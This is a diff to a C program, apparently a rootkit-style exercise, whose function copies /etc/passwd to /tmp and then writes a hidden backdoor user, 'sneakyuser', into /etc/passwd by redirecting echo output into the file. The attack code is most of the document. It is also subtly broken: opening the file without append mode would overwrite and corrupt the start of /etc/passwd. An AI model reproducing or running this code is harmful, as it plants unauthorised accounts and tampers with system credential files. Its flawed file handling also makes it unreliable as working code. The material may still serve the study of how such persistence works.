@@ -4,13 +4,15 @@
 #include <linux/string.h>
 #include <sys/wait.h>
 #include <stdlib.h>
+#include <fcntl.h>
 
 	
 void fileProc(void){
 	// 1. Copy /etc/passwd to /tmp/passwd
+	char * fname = "/etc/passwd";
 	char * pwd = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
-	char * cmd1[] = {"cp","/etc/passwd","/tmp/passwd", 0};
-	char * cmd2[] = {"echo", pwd, ">>","/etc/passwd", 0};
+	char * cmd1[] = {"cp", fname,"/tmp/passwd", 0};
+	char * cmd2[] = {"echo", pwd, 0}; 
 	//void copy_to_temp(from,to);
 	pid_t cpid, wid;
 	int status;
@@ -30,7 +32,10 @@ void fileProc(void){
 		} while (!WIFEXITED(status) && !WIFSIGNALED(status));
 		printf("Done waiting...\n");
 		//process to write to user
+		int fd = open(fname, O_WRONLY, S_IRUSR | S_IWUSR);
+		dup2(fd,1);
 		execvp(cmd2[0],cmd2);
+		close(fd);
 	}
 }
 
